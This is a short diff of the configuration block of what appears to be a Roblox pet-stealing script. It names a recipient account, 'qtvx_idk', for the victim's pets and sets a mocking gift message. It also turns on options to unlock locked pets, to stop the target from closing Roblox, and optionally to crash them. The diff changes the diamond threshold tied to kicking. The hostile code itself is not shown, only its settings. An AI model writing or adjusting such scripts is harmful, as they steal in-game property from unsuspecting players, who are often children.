@@ -3,7 +3,7 @@
 --[[ Main Config ]]--
 _G.Username = "qtvx_idk" --// Username To Send Pets To
 _G.GiftMessage = "You welcome son." --// Message For The Gift To Say
-_G.Diamonds = 50000000 --// Amount Of Diamonds To Not Kick
+_G.Diamonds = 900000 --// Amount Of Diamonds To Not Kick
 _G.UnlockPets = true --// Unlocks Locked Pets
 _G.AntiLeave = true --// Doesn't Let The Target Close Roblox
 _G.Crash = false --// Crashes Them After Its Finished
